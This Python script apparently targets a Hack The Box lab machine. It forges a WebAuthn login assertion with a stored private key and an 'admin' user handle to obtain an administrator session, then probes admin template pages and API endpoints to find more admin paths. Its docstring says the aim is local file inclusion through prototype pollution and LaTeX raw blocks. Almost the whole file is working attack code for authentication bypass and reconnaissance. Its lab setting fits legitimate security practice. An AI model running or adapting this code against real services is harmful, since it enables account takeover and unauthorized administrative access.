#!/usr/bin/env python3
"""Admin template LFI via prototype pollution + LaTeX raw blocks."""
import json
import pickle
import re
import sys
import hashlib
import struct
import requests
from fido2.utils import websafe_decode, websafe_encode
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes, serialization

BASE = "http://10.129.115.125:3000"
RP_ID = "aegis.korvia.htb"
ORIGIN = "http://aegis.korvia.htb:3000"
HEADERS = {"Host": "aegis.korvia.htb"}
CRED_PATH = r"C:\Users\tdgf\OneDrive\Bureau\CODE\Repo\HTB\aegis_cred.pkl"
TEMPLATE = "firmware-critical-v4"


def get_session():
    data = pickle.load(open(CRED_PATH, "rb"))
    priv = serialization.load_pem_private_key(data["priv_pem"], password=None)
    cred_id = data["cred_id"]
    s = requests.Session()
    s.headers.update(HEADERS)
    r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/begin", json={}, timeout=60)
    r.raise_for_status()
    challenge = websafe_decode(r.json()["challenge"])
    rp_id_hash = hashlib.sha256(RP_ID.encode()).digest()
    auth_data = rp_id_hash + bytes([0x01]) + struct.pack(">I", 3)
    client_data = json.dumps(
        {
            "type": "webauthn.get",
            "challenge": websafe_encode(challenge),
            "origin": ORIGIN,
            "crossOrigin": False,
        },
        separators=(",", ":"),
    ).encode()
    sig = priv.sign(auth_data + hashlib.sha256(client_data).digest(), ec.ECDSA(hashes.SHA256()))
    body = {
        "id": websafe_encode(cred_id),
        "rawId": websafe_encode(cred_id),
        "type": "public-key",
        "response": {
            "clientDataJSON": websafe_encode(client_data),
            "authenticatorData": websafe_encode(auth_data),
            "signature": websafe_encode(sig),
            "userHandle": websafe_encode(b"admin"),
        },
        "clientExtensionResults": {},
    }
    r = s.post(f"{BASE}/api/v1/auth/webauthn/auth/finish", json=body, timeout=60)
    r.raise_for_status()
    print("[+] admin session ok", r.json())
    return s


def explore(s):
    for path in [
        "/dashboard",
        "/admin/templates",
        f"/admin/templates/{TEMPLATE}",
        f"/admin/templates/{TEMPLATE}/edit",
        "/api/v1/templates",
        f"/api/v1/templates/{TEMPLATE}",
    ]:
        r = s.get(BASE + path, timeout=30, allow_redirects=False)
        print(path, r.status_code, r.headers.get("content-type"), len(r.text))
        if "json" in (r.headers.get("content-type") or "") or path.startswith("/api"):
            print(r.text[:500])
        elif r.status_code == 200:
            # find api endpoints in html/js
            for m in re.findall(r'["\'](/[^"\']*template[^"\']*)["\']', r.text, re.I):
                print("  found", m)
            for m in re.findall(r'["\'](/admin/[^"\']+)["\']', r.text):
                print("  admin", m)


if __name__ == "__main__":
    s = get_session()
    explore(s)
